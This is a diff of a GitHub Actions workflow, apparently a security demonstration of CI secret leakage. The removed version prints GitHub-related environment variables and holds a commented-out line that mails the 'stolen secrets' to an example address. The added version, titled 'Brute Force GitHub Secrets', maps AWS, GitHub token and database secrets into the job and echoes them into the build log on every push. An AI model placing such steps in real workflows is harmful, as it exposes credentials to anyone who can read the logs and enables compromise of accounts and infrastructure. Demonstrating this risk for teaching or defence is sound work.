@@ -1,19 +1,21 @@
-name: Insecure GitHub Action Demo
+name: Brute Force GitHub Secrets
 
 on: push
 
 jobs:
-  compromised_action:
+  secret_scanner:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout Code
         uses: actions/checkout@v3
 
-      - name: 🔥 Exfiltrating Secrets
+      - name: 🔍 Trying Common Secret Names
+        env:
+          AWS_SECRET_KEY: ${{ secrets.AWS_SECRET_KEY }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
         run: |
-          echo "⚠️ RUNNING MALICIOUS ACTION..."
-          echo "🔓 Leaked Secrets:"
-          env | grep -i 'github'  # Print GitHub-related environment variables
-          
-          # OPTIONAL: Email the stolen secrets (uncomment below)
-          # echo "🔥 GitHub Secrets: $(env | grep -i 'github')" | mail -s "Secrets Leak" your-email@example.com
+          echo "Trying to access common secrets..."
+          echo "🔓 AWS_SECRET_KEY: $AWS_SECRET_KEY"
+          echo "🔓 GITHUB_TOKEN: $GITHUB_TOKEN"
+          echo "🔓 DATABASE_URL: $DATABASE_URL"
